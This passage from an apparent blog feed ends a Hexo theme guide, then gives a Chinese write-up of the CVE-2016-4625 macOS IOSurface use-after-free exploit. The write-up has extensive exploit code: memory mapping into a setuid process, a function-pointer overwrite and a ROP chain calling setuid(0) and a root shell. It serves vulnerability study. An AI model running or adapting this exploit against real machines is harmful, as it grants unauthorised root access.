version</div><div class="line">version: <span class="number">0.0</span><span class="number">.0</span></div></pre></td></tr></table></figure>
<ul>
<li>fancybox - 是否启用Fancybox图片灯箱效果</li>
<li>duoshuo - 多说评论 shortname</li>
<li>disqus - Disqus评论 shortname</li>
<li>google_search - 默认使用Google搜索引擎</li>
<li>baidu_search - 若想使用百度搜索，将其设定为true。</li>
<li>swiftype - Swiftype 站内搜索key</li>
<li>tinysou - 微搜索 key</li>
<li>self_search - 基于jQuery的本地搜索引擎，需要安装hexo-generator-search插件使用。</li>
<li>google_analytics - Google Analytics 跟踪ID</li>
<li>baidu_analytics - 百度统计 跟踪ID</li>
<li>show_category_count - 是否显示侧边栏分类数目</li>
<li>shareto - 是否使用分享按鈕</li>
<li>busuanzi - 是否使用不蒜子页面访问计数</li>
<li>widgets_on_small_screens - 是否在移动设备屏幕底部显示侧边栏</li>
<li>menu - 自定义页面及菜单，依照已有格式填写。填写后请在source目录下建立相应名称的文件夹，并包含index.md文件，以正确显示页面。导航菜单中集成了FontAwesome图标字体，可以在这里选择新的图标，并按照* 相关说明使用。</li>
<li>widgets - 选择和排列希望使用的侧边栏小工具。</li>
<li>links - 友情链接，请依照格式填写。</li>
<li>timeline - 网站历史时间线，在页面front-matter中设置layout: timeline可显示。</li>
<li>Static files - 静态文件存储路径，方便设置CDN缓存。</li>
<li>Theme version - 主题版本，便于静态文件更新后刷新CDN缓存。</li>
</ul>
<h3 id="主题特性"><a href="#主题特性" class="headerlink" title="主题特性"></a>主题特性</h3><hr>
<h4 id="网站图标"><a href="#网站图标" class="headerlink" title="网站图标"></a>网站图标</h4><p>若要设置网站Favicon，可以将favicon.ico放在Hexo根目录的source文件夹下，建议的大小：32px*32px。</p>
<p>若要为网站添加苹果设备图标，请将命名为apple-touch-icon.png的图片放在同样的位置，建议的大小：114px*114px。</p>
<h4 id="文章摘要"><a href="#文章摘要" class="headerlink" title="文章摘要"></a>文章摘要</h4><p>首页默认显示文章摘要而非全文，可以在文章的front-matter中填写一项description:来设置你想显示的摘要，或者直接在文章内容中插入<!--more-->以隐藏后面的内容。<br>若两者都未设置，则自动截取文章第一段作为摘要。</p>
<h4 id="添加页面"><a href="#添加页面" class="headerlink" title="添加页面"></a>添加页面</h4><p>在source目录下建立相应名称的文件夹，然后在文件夹中建立index.md文件，并在index.md的front-matter中设置layout为<code>layout: page</code>。若需要单栏页面，就将layout设置为 layout: single-column。</p>
<h4 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h4><p>在文章的front-matter中添加toc: true即可让该篇文章显示目录。</p>
<h4 id="文章评论"><a href="#文章评论" class="headerlink" title="文章评论"></a>文章评论</h4><p>文章和页面的评论功能可以通过在front-matter中设置comments: true或comments: false来进行开启或关闭（默认开启）。</p>
<p>注意：如果没有出现 多说评论框，很有可能是登录多说帐号失败。请打开浏览器调试窗口查看请求是否成功。</p>
<h4 id="语法高亮"><a href="#语法高亮" class="headerlink" title="语法高亮"></a>语法高亮</h4><p>要启用代码高亮，请在Hexo目录的_config.yml中将highlight选项按照如下设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">highlight:</div><div class="line">  enable: true</div><div class="line">  auto_detect: true</div><div class="line">  line_number: true</div><div class="line">  tab_replace:</div></pre></td></tr></table></figure></p>
<h4 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h4><p>要启用数学公式支持，请在Hexo目录的_config.yml中添加：</p>
<p><code>mathjax: true</code><br>并在相应文章的front-matter中添加<code>mathjax: true</code>，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">title: Test Math</div><div class="line">date: 2016-04-05 14:16:00</div><div class="line">categories: math</div><div class="line">mathjax: true</div><div class="line">---</div></pre></td></tr></table></figure></p>
<h4 id="支持语言"><a href="#支持语言" class="headerlink" title="支持语言"></a>支持语言</h4><p>目前支持简体中文（zh-CN），繁体中文（zh-TW），英语（en），法语（fr-FR），德语（de-DE），韩语（ko）和西班牙语（es-ES），欢迎翻译至其它语言。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转载自：&lt;a href=&quot;https://www.haomwei.com/technology/maupassant-hexo.html#文章摘要&quot;&gt;https://www.haomwei.com/technology/maupassant-hexo.html#文章摘要&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="捣鼓" scheme="http://yoursite.com/categories/categories-fiddle/"/>
    
    
      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>浅谈 CVE-2016-4625 exploit</title>
    <link href="http://yoursite.com/2017/03/06/%E6%B5%85%E8%B0%88CVE-2016-4625-exploit/"/>
    <id>http://yoursite.com/2017/03/06/浅谈CVE-2016-4625-exploit/</id>
    <published>2017-03-06T06:54:26.000Z</published>
    <updated>2017-03-09T16:29:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>(本人第一次接触 OSX 系统，这篇文章对我来说难度还是比较大的，本人水平有限文章难免有错，请路过的大牛多多指点，轻拍)</p>
<p>本文是为分析 yalu102越狱工具做铺垫，这个漏洞并没有在 yalu越狱中被使用，因为这个漏洞是 macOS 中的。<br>分析本文是为了学习 XNU 中 task 结构体存在的分险并且结合 port 来实现提权的原理。</p>
<a id="more"></a>
<p>预备知识：</p>
<ul>
<li>IOKit 开发基础知识</li>
<li>Mach Port 通信基础知识</li>
</ul>
<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>IOSurface是基于 IOKit的一个扩展模块，IOUserClient 的扩展类IOSurfaceRootUserClient 的成员fTask（0xf）引用了用户空间的 task struct 指针，但是没有修改task的引用计数器，由此产生了一个 UAF 漏洞。如果task 对应的进程被杀死，task struct 对象会被回收，IOSurfaceRootUserClient 成员fTask 就变成了一个 悬挂指针。</p>
<p>Apple 在其开发者网站上提供了一份 IOKit 扩展设计样式的示例 AppleSamplePCI。因为示例中存在dangling 指针漏洞，所以 Ian Beer 就去 IOSurface 模块中查找对应的代码，利用 IOSurface 模块中的 dangling 漏洞来执行任意代码。因为这个开发模板中存在漏洞所以会影响 Apple 开发的所有IOKit 子模块。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//AppleSamplePCI.kext implementation of initWithTask</span></div><div class="line"><span class="keyword">bool</span> SamplePCIUserClientClassName::initWithTask(</div><div class="line">  <span class="keyword">task_t</span> owningTask,</div><div class="line">  <span class="keyword">void</span>* securityID,</div><div class="line">  UInt32 type,</div><div class="line">  OSDictionary* properties)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">bool</span> success = super::initWithTask(owningTask,</div><div class="line">                                     securityID,</div><div class="line">                                     type,</div><div class="line">                                     properties);</div><div class="line">  fTask = owningTask;       <span class="comment">//bug 悬挂指针</span></div><div class="line">  fDriver = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> success;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="漏洞利用思想："><a href="#漏洞利用思想：" class="headerlink" title="漏洞利用思想："></a>漏洞利用思想：</h3><p><img src="/include/img/4625/exploit-all.jpg" alt="exploit-all"></p>
<p>此漏洞的提权思想很简单，因为不受沙盒的限制所以还可以用来做沙盒绕过。<br><strong>exploit的核心就是将 shellcode注入到所有者是root 用户并且拥有 s执行权限的子进程中，这个进程开启的 shell 是root用户的， shellcode可以直接作为子进程的参数传递到栈上。</strong></p>
<p>shellcode 本身很简单，重点在第3-4步将子进程的执行权限窃取到 shellcode 上，并且要精准计算栈的偏移量。<br>其他还有一下技巧性的东西，比如第2步如何控制子进程让其在退出前阻塞、如何将子进程的 task port 发送到父进程中。<br>（下文可能会出现上面流程图中的编号，请根据上下文识别）</p>
<h3 id="分析-exploit"><a href="#分析-exploit" class="headerlink" title="分析 exploit"></a>分析 exploit</h3><p>这里会分成2部分：</p>
<ol>
<li>准备阶段，负责提供一个触发漏洞的环境和执行负载的环境。</li>
<li>攻击阶段，分析如何使用漏洞来达到劫持控制流、任意地址写以及 shellcode 的功能。</li>
</ol>
<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>将parent 的port 传递给child， 然后让child 将其task port 传递给 parent的步骤：</p>
<ol>
<li>父进程通过task_get_special_port获取他的special ports，并存储在局部变量中。special ports是一些连接着系统服务的port，在fork的过程中，子进程会继承special port。</li>
<li>父进程通过mach_port_allocate函数创建一个新的port，通过task_set_special_port将这个新的port设为special port，且通过mach_port_insert_right为这个新的port赋予写的权限。并最终试图将这个新的port传递给子进程。</li>
<li>父进程进行fork，子进程继承了<a href="https://googleprojectzero.blogspot.kr/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">2</a>中创建的新的port，作为自己的special port。</li>
<li>父进程将保存的在临时变量中的special port，重新设置回来。</li>
<li>子进程获取这个替换过的special port，并且保存下来。</li>
<li>子进程通过继承的special port和父进程通信。</li>
<li>父进程在收到子进程的消息后，将当前的special port再发送给子进程。</li>
<li>子进程也将收到的special port设置为自己的special port。</li>
<li>子进程将自己的 task port 发送给父进程</li>
</ol>
<p>对应的流程图：<br><img src="/include/img/4625/port_dance.jpg" alt="port-dance"></p>
<p>port dancer主要的目的是将子进程的 task port传递给父进程，父进程可以使用子进程的 task port创建 IOSurface 的 userclient 对象。</p>
<h4 id="攻击阶段"><a href="#攻击阶段" class="headerlink" title="攻击阶段"></a>攻击阶段</h4><p>上一节我们已经获取 子进程的 task port, 那么现在就可以 将子进程的 task port 传递给 IOSurface 制造一个悬挂指针，接下来可以重新开启一个子进程 运行tracerout6来偷梁换柱了，然后想办法获取写子进程内存的权限，通过覆盖子进程的函数指针__cleanup获取控制流执行 shellcode。</p>
<p>按照执行顺序将攻击流程分成2部分:</p>
<pre><code>1. 覆盖子进程__cleanup函数指针
2. 执行 shellcode。
</code></pre><ol>
<li><p>覆盖子进程__cleanup 函数指针<br> 要 overwrite 首先要任意地址写。IOSurface 框架可以做到这一点，看雪翻译的一篇<a href="http://bbs.pediy.com/thread-215839.htm" target="_blank" rel="external">文章</a>中介绍，IOSurface框架提供了适用于跨进程共享的框架缓冲对象,IOSurfaces仅仅用来包裹共享内存缓冲区。</p>
<ul>
<li><p>IOSurfaceRootUserClient::create_surface() 接受一个键值对作为参数来创建共享内存对象，其他进程可以把这个对象映射到它们自己的地址空间中。<br>参数：<br>  IOSurfaceAddress -&gt; target_addr<br>  IOSurfaceAllocSize -&gt; 0x1000<br>  IOSurfacesGlobal-&gt;True    允许其他 ioSurface 访问 当前 iosurface 对象。</p>
</li>
<li><p>IOSurfaceRootUserClient::lookup_surface()将目标进程的内存共享对象，映射到当前进程。</p>
</li>
</ul>
</li>
</ol>
<p><em>使用上面的代码， 可以将目标进程 的 iosurface 创建的共享内存 地址 target-addr 开始的0x1000 大小的内存</em></p>
<p>我们要 root 就需要在 获取共享内存对象之前，将 fTask 指向的 task 对象换成一个 更高权限的 进程的 task 结构体。这样我们就可以获取到 包裹高权限的 进程的共享内存对象了。</p>
<p>下面分析 准备阶段的代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">io_connect_t</span> dangler = get_uc(child_task_port);        [<span class="number">0</span>] 使用 child task 创建一个 iosurface 对象，返回 iosurface 对象的 <span class="function">port</span></div><div class="line"></div><div class="line">  <span class="title">printf</span><span class="params">(<span class="string">"got dangler\n"</span>)</span>;</div><div class="line"></div><div class="line">  mach_port_deallocate(mach_task_self(), child_task_port); [<span class="number">1</span>] 杀死子进程</div><div class="line">  kill(child_pid, <span class="number">9</span>);</div><div class="line"> ...</div><div class="line"></div><div class="line">  <span class="keyword">int</span> target_pid = <span class="number">0</span>;</div><div class="line">  <span class="keyword">int</span> blocker = fork_and_exec_blocking(<span class="string">"/usr/sbin/traceroute6"</span>, argv, <span class="literal">NULL</span>, &amp;target_pid);        [<span class="number">2</span>] 创建一个高权限的进程，替换 fTask 对象</div><div class="line"></div><div class="line"><span class="comment">// 构造create_surface 的参数 dictionary</span></div><div class="line">  CFMutableDictionaryRef surface_props = CFDictionaryCreateMutable(kCFAllocatorDefault,</div><div class="line">                                                                   <span class="number">0</span>,</div><div class="line">                                                                   &amp;kCFTypeDictionaryKeyCallBacks,</div><div class="line">                                                                   &amp;kCFTypeDictionaryValueCallBacks);</div><div class="line"></div><div class="line">  <span class="keyword">uint64_t</span> target_addr = fptr_page;</div><div class="line">  <span class="keyword">uint32_t</span> target_size = <span class="number">0x1000</span>;</div><div class="line"></div><div class="line"><span class="comment">// 向 dictionary 中添加 目标进程的共享内存其实地址 + 共享内存大小</span></div><div class="line">  CFDictionarySetValue(surface_props, CFSTR(<span class="string">"IOSurfaceAddress"</span>), CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &amp;target_addr));</div><div class="line">  CFDictionarySetValue(surface_props, CFSTR(<span class="string">"IOSurfaceAllocSize"</span>), CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &amp;target_size));</div><div class="line">  CFDictionarySetValue(surface_props, CFSTR(<span class="string">"IOSurfaceIsGlobal"</span>), kCFBooleanTrue);</div><div class="line"></div><div class="line">  CFDataRef props_data = IOCFSerialize(surface_props, kNilOptions);</div><div class="line">  <span class="keyword">void</span>* inputStruct = (<span class="keyword">void</span>*)CFDataGetBytePtr(props_data);</div><div class="line">  <span class="keyword">size_t</span> inputStructCnt = (<span class="keyword">size_t</span>)CFDataGetLength(props_data);</div><div class="line"></div><div class="line">  <span class="keyword">uint64_t</span> inputScalar[<span class="number">16</span>];</div><div class="line">  <span class="keyword">size_t</span> inputScalarCnt = <span class="number">0</span>;</div><div class="line"></div><div class="line">  <span class="keyword">uint64_t</span> outputScalar[<span class="number">16</span>];</div><div class="line">  <span class="keyword">uint32_t</span> outputScalarCnt = <span class="number">0</span>;</div><div class="line"></div><div class="line">  <span class="keyword">char</span> outputStruct[<span class="number">0x548</span>];</div><div class="line">  <span class="keyword">size_t</span> outputStructCnt = <span class="number">0x548</span>;</div><div class="line"></div><div class="line">  <span class="comment">// create_surface</span></div><div class="line">  <span class="keyword">int</span> selector = <span class="number">0</span>;</div><div class="line"></div><div class="line">  err = IOConnectCallMethod(                    [<span class="number">3</span>] 调用 create_surface 函数，在目标进程中创建 共享内存对象</div><div class="line">          dangler,</div><div class="line">          selector,</div><div class="line">          inputScalar,</div><div class="line">          inputScalarCnt,</div><div class="line">          inputStruct,</div><div class="line">          inputStructCnt,</div><div class="line">          outputScalar,</div><div class="line">          &amp;outputScalarCnt,</div><div class="line">          outputStruct,</div><div class="line">          &amp;outputStructCnt);</div><div class="line"></div><div class="line">说明： 在这提一下iokit 扩展通信都是通过 selector 来代替函数名。</div><div class="line"></div><div class="line"><span class="keyword">int</span> target_surface_id = *(<span class="keyword">int</span>*)(&amp;outputStruct[<span class="number">0x10</span>]);</div><div class="line"></div><div class="line">  <span class="keyword">io_connect_t</span> surface = get_uc(mach_task_self());            [<span class="number">4</span>] 使用 parent task 创建一个 iosurface 对象，返回 iosurface 对象的 port</div><div class="line"></div><div class="line">  inputStruct = <span class="literal">NULL</span>;</div><div class="line">  inputStructCnt = <span class="number">0</span>;</div><div class="line"></div><div class="line">  inputScalar[<span class="number">0</span>] = target_surface_id;</div><div class="line">  inputScalarCnt = <span class="number">1</span>;</div><div class="line"></div><div class="line">  outputStructCnt = <span class="number">0x548</span>;</div><div class="line"></div><div class="line">  <span class="comment">// lookup_surface</span></div><div class="line">  selector = <span class="number">6</span>;</div><div class="line"></div><div class="line">  err = IOConnectCallMethod(                                    [<span class="number">5</span>] 调用lookup_surface函数， 将目标进程的共享内存映射到 parent 进程</div><div class="line">          surface,</div><div class="line">          selector,</div><div class="line">          inputScalar,</div><div class="line">          inputScalarCnt,</div><div class="line">          inputStruct,</div><div class="line">          inputStructCnt,</div><div class="line">          outputScalar,</div><div class="line">          &amp;outputScalarCnt,</div><div class="line">          outputStruct,</div><div class="line">          &amp;outputStructCnt);</div><div class="line"></div><div class="line">  <span class="keyword">char</span>* shared_page = *(<span class="keyword">char</span>**)(&amp;outputStruct[<span class="number">0</span>]);</div><div class="line">  shared_page[<span class="number">0</span>] = ‘B’;</div><div class="line">  *(<span class="keyword">uint64_t</span>*)(shared_page+fptr_offset) = stack_shift_gadget;                [<span class="number">6</span>] 第一段 gadget 地址覆盖 目标进程的__cleanup 函数指针</div><div class="line"></div><div class="line"><span class="comment">// 下一节 介绍</span></div><div class="line">  unblock_pipe_and_interact(blocker);</div><div class="line"></div><div class="line">  <span class="keyword">int</span> sl;</div><div class="line">  wait(&amp;sl);</div></pre></td></tr></table></figure></p>
<p>上述 1-6 步就是parent获取child共享内存的原语， 并且覆盖了目标进程的 __cleanup 全局变量。<br>步骤 2 中还使用了一个技巧<a href="阻塞进程">3</a>使得child进程能在 exit 之前阻塞，等待parent映射内存设置 shellcode。</p>
<p>总结一下</p>
<ol>
<li><p>让child task 阻塞的原语<br>给 traceroute6 一个无效参数traceroute6会使用 strerr 标准错误输出错误信息，但是 parent 使用管道pip_write 替换了标准错误输出，并且管道已经阻塞了所以traceroute6卡在程序中无法调用exit 函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"traceroute6: invalid wait time.\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</div></pre></td></tr></table></figure>
</li>
<li><p>parent将child task的1页内存映射到自己的内存空间的原语<br>上面 提到了细节<br>这里 映射的是  libsystem_c.dylib:<strong>DATA ，其中包含了 </strong>cleanup 函数指针的地址。（这个地址要用 add_gadget 的地址去覆盖， exit 的时候会调用这个函数）</p>
</li>
</ol>
<h4 id="shellcode-分析"><a href="#shellcode-分析" class="headerlink" title="shellcode 分析"></a>shellcode 分析</h4><p>创建 shellcode 的代码在 setup_payload_and_offsets 函数中，要覆盖 DATA段的__cleanup 函数指针首先要获取其位置然后查找几段 gadget，执行的数序是：</p>
<ul>
<li>修改 rsp,跳转到 traceroute6 进程栈的参数区</li>
<li>大量的 ret slide 指令，提高shellcode 的兼容性</li>
<li>执行 setuid(0)的 shellcode</li>
<li>执行 system(“/bin/csh”)的 shellcode</li>
</ul>
<p>下面继续分析代码。</p>
<p>参数说明:</p>
<pre><code>stack_shift : 第一段 gadget 的地址
fptr_page : 目标进程建立共享内存的起始地址
fptr_offset : __cleanup 相对 fptr_page 的偏移
</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">char</span>** <span class="title">setup_payload_and_offsets</span><span class="params">(<span class="keyword">uint64_t</span>* stack_shift, <span class="keyword">uint64_t</span>* fptr_page, <span class="keyword">uint32_t</span>* fptr_offset)</span> </span>&#123;</div><div class="line"></div><div class="line">   <span class="comment">// &amp;__cleanup: __DATA 段中 __cleanup 的地址</span></div><div class="line">   <span class="comment">// __cleanup : 是 libsystem_c.dylib 中对应函数的地址</span></div><div class="line">  *fptr_page = (<span class="keyword">uint64_t</span>)((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)(&amp;__cleanup) &amp; ~(<span class="number">0xfff</span>ULL));        [<span class="number">0</span>] 代码段内存共享，所以各个进程中__cleanup地址都一样</div><div class="line">  *fptr_offset = ((<span class="keyword">uint64_t</span>)(&amp;__cleanup)) - *fptr_page;</div><div class="line"></div><div class="line">  <span class="comment">//[1] 搜索 ret 指令</span></div><div class="line">  <span class="keyword">uint8_t</span>* ret = (<span class="keyword">uint8_t</span>*)&amp;<span class="built_in">strcpy</span>; <span class="comment">// the start of libsystem_c</span></div><div class="line">  <span class="keyword">do</span> &#123;</div><div class="line">    ret += <span class="number">1</span>;</div><div class="line">    ret = memmem(ret, <span class="number">0x1000000</span>, <span class="string">"\xc3"</span>, <span class="number">1</span>);   <span class="comment">//search 'ret'</span></div><div class="line">  &#125; <span class="keyword">while</span> (ret != <span class="literal">NULL</span> &amp;&amp; ((count_nulls((<span class="keyword">uint64_t</span>)ret)) != <span class="number">2</span>) );</div><div class="line">..</div><div class="line">  <span class="comment">//[2]. pop rdi; ret gadget</span></div><div class="line">  <span class="keyword">uint8_t</span>* pop_rdi_ret = memmem(&amp;<span class="built_in">strcpy</span>, <span class="number">0x1000000</span>, <span class="string">"\x5f\xc3"</span>, <span class="number">2</span>);</div><div class="line">  <span class="keyword">if</span> (pop_rdi_ret == <span class="literal">NULL</span>) &#123;</div><div class="line">    FAIL(<span class="string">"couldn't find pop rdi; ret gadget\n"</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">//[3]. /bin/sh string:</span></div><div class="line">  <span class="keyword">void</span>* bin_sh = ((<span class="keyword">char</span>*)__cleanup)-(<span class="number">1024</span>*<span class="number">1024</span>); <span class="comment">// start from 1MB below this symbol in libsystem_c.dylib</span></div><div class="line">  bin_sh = memmem(bin_sh, <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>, <span class="string">"/bin/csh"</span>, <span class="number">9</span>);</div><div class="line">  <span class="keyword">if</span> (bin_sh == <span class="literal">NULL</span>) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"couldn't find /bin/sh string\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//[4]. 搜索 修改 rsp 的 gadget</span></div><div class="line"></div><div class="line"><span class="keyword">uint8_t</span>* stack_shift_gadget = memmem(&amp;realpath, <span class="number">0x4000</span>, <span class="string">"\x48\x81\xc4"</span>, <span class="number">3</span>);</div><div class="line">  <span class="keyword">if</span> (stack_shift == <span class="literal">NULL</span>) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"couldn't find stack shift\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line"><span class="comment">// libsystem_c.dylib`realpath$DARWIN_EXTSN:</span></div><div class="line"><span class="comment">// 0x7fffa333ab47 &lt;+1908&gt;: addq   $0x1d98, %rsp             ; imm = 0x1D98</span></div><div class="line"><span class="comment">// 0x7fffa333ab4e &lt;+1915&gt;: popq   %rbx</span></div><div class="line"><span class="comment">// 0x7fffa333ab4f &lt;+1916&gt;: popq   %r12</span></div><div class="line"><span class="comment">// 0x7fffa333ab51 &lt;+1918&gt;: popq   %r13</span></div><div class="line"><span class="comment">// 0x7fffa333ab53 &lt;+1920&gt;: popq   %r14</span></div><div class="line"><span class="comment">// 0x7fffa333ab55 &lt;+1922&gt;: popq   %r15</span></div><div class="line"><span class="comment">// 0x7fffa333ab57 &lt;+1924&gt;: popq   %rbp</span></div><div class="line"><span class="comment">// 0x7fffa333ab58 &lt;+1925&gt;: retq</span></div><div class="line"></div><div class="line">  <span class="comment">//获取 add rsp 的立即数</span></div><div class="line">  <span class="keyword">uint32_t</span> realpath_shift_amount = *(<span class="keyword">uint32_t</span>*)(stack_shift_gadget+<span class="number">3</span>);  <span class="comment">//0x1d98 </span></div><div class="line"></div><div class="line">  <span class="comment">// 这里预测 traceroute6 的栈大小</span></div><div class="line">  <span class="keyword">uint32_t</span> traceroute6_stack_size = <span class="number">0x948</span>;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (realpath_shift_amount - <span class="number">0x200</span> &lt; traceroute6_stack_size) &#123;</div><div class="line">    <span class="comment">//add rsp, xxx  这个值不够大，无法跳转到 argv 区</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"that stack shift gadget probably isn't big enough...\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">  &#125;</div><div class="line">    </div><div class="line">  *stack_shift = (<span class="keyword">uint64_t</span>)stack_shift_gadget;</div><div class="line"></div><div class="line"><span class="keyword">int</span> ret_slide_length = ((realpath_shift_amount - traceroute6_stack_size) / <span class="number">8</span> / <span class="number">5</span>) * <span class="number">2</span>;</div><div class="line"></div><div class="line"></div><div class="line">  <span class="keyword">char</span>* progname = <span class="string">"/usr/sbi"</span> <span class="comment">//8</span></div><div class="line">                   <span class="string">"n/tracer"</span> <span class="comment">//8</span></div><div class="line">                   <span class="string">"oute6"</span>;   <span class="comment">//6</span></div><div class="line">  <span class="keyword">char</span>* optname  = <span class="string">"-w"</span>;      <span class="comment">//3</span></div><div class="line">  <span class="keyword">char</span>* optval   = <span class="string">"LOLLLL"</span>;  <span class="comment">//7</span></div><div class="line"></div><div class="line"><span class="comment">// 这里 『+6』 是因为 ret slide 后面 还有 pop_rdi_ret 到&amp;system 6条指令。</span></div><div class="line">  <span class="keyword">size_t</span> target_argv_rop_size = (ret_slide_length + <span class="number">6</span>)* <span class="number">8</span>; <span class="comment">// ret slides plus slots for the actual rop</span></div><div class="line"></div><div class="line">  <span class="keyword">uint8_t</span>** args_u64 = <span class="built_in">malloc</span>(target_argv_rop_size + <span class="number">1</span>); <span class="comment">// plus extra NULL byte at the end</span></div><div class="line">  <span class="keyword">char</span>* args = (<span class="keyword">char</span>*)args_u64;</div><div class="line">  <span class="built_in">memset</span>(args, <span class="number">0</span>, target_argv_rop_size + <span class="number">1</span>);</div><div class="line"></div><div class="line">  <span class="comment">// ret-slide  写入堆中</span></div><div 